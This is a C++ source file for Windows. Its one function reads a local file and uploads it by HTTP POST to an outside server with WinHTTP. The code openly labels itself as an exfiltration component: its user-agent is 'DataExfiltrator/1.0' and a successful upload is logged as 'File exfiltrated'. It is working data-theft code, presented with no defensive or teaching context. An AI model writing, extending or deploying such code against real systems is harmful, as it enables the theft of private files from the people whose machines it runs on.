// Networking.cpp
#include "Networking.h"
#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <string>

#pragma comment(lib, "winhttp.lib")

bool Networking::uploadFile(const std::string& filePath, const std::string& targetURL) {
    // Initialize URL_COMPONENTS structure
    URL_COMPONENTS urlComp;
    memset(&urlComp, 0, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);

    // Allocate buffers for host and path
    wchar_t hostName[256];
    wchar_t urlPath[1024];
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = sizeof(hostName) / sizeof(wchar_t);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = sizeof(urlPath) / sizeof(wchar_t);

    // Convert targetURL to wide string
    std::wstring wTargetURL(targetURL.begin(), targetURL.end());

    // Parse the URL into components
    if (!WinHttpCrackUrl(wTargetURL.c_str(), static_cast<DWORD>(wTargetURL.length()), 0, &urlComp)) {
        std::wcerr << L"[ERROR] Failed to parse URL: " << wTargetURL << L" - Error: " << GetLastError() << std::endl;
        return false;
    }

    // Open a WinHTTP session
    HINTERNET hSession = WinHttpOpen(L"DataExfiltrator/1.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        std::wcerr << L"[ERROR] WinHttpOpen failed with error: " << GetLastError() << std::endl;
        return false;
    }

    // Connect to the server
    HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName,
                                        urlComp.nPort, 0);
    if (!hConnect) {
        std::wcerr << L"[ERROR] WinHttpConnect failed with error: " << GetLastError() << std::endl;
        WinHttpCloseHandle(hSession);
        return false;
    }

    // Open an HTTP POST request
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST",
                                            urlComp.lpszUrlPath,
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ?
                                            WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) {
        std::wcerr << L"[ERROR] WinHttpOpenRequest failed with error: " << GetLastError() << std::endl;
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // Read the file into memory
    HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[ERROR] Failed to open file: " << filePath << " - Error: " << GetLastError() << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        std::cerr << "[ERROR] Failed to get file size: " << filePath << " - Error: " << GetLastError() << std::endl;
        CloseHandle(hFile);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    char* buffer = new(std::nothrow) char[fileSize];
    if (!buffer) {
        std::cerr << "[ERROR] Memory allocation failed for file: " << filePath << std::endl;
        CloseHandle(hFile);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        std::cerr << "[ERROR] Failed to read file: " << filePath << " - Error: " << GetLastError() << std::endl;
        delete[] buffer;
        CloseHandle(hFile);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    CloseHandle(hFile); // Close the file handle after reading

    // Set the Content-Type header to indicate binary data
    std::wstring headers = L"Content-Type: application/octet-stream\r\n";
    if (!WinHttpAddRequestHeaders(hRequest, headers.c_str(),
                                  static_cast<DWORD>(headers.length()), WINHTTP_ADDREQ_FLAG_ADD)) {
        std::wcerr << L"[ERROR] WinHttpAddRequestHeaders failed with error: " << GetLastError() << std::endl;
        delete[] buffer;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // Send the HTTP POST request with the file data
    BOOL sendResult = WinHttpSendRequest(hRequest,
                                         WINHTTP_NO_ADDITIONAL_HEADERS,
                                         0, buffer, fileSize,
                                         fileSize, 0);
    delete[] buffer; // Free the buffer after sending

    if (!sendResult) {
        std::wcerr << L"[ERROR] WinHttpSendRequest failed with error: " << GetLastError() << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // Receive the HTTP response
    BOOL receiveResult = WinHttpReceiveResponse(hRequest, NULL);
    if (!receiveResult) {
        std::wcerr << L"[ERROR] WinHttpReceiveResponse failed with error: " << GetLastError() << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // Query the HTTP status code
    DWORD statusCode = 0;
    DWORD size = sizeof(statusCode);
    if (WinHttpQueryHeaders(hRequest,
                            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                            WINHTTP_HEADER_NAME_BY_INDEX,
                            &statusCode, &size, WINHTTP_NO_HEADER_INDEX)) {
        if (statusCode == 200 || statusCode == 201) {
            std::cout << "[SUCCESS] File exfiltrated: " << filePath << std::endl;
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return true;
        } else {
            std::wcerr << L"[ERROR] HTTP status code: " << statusCode 
                       << L" for file: " << std::wstring(filePath.begin(), filePath.end()) << std::endl;
        }
    } else {
        std::wcerr << L"[ERROR] WinHttpQueryHeaders failed with error: " << GetLastError() << std::endl;
    }

    // Cleanup handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return false;
}
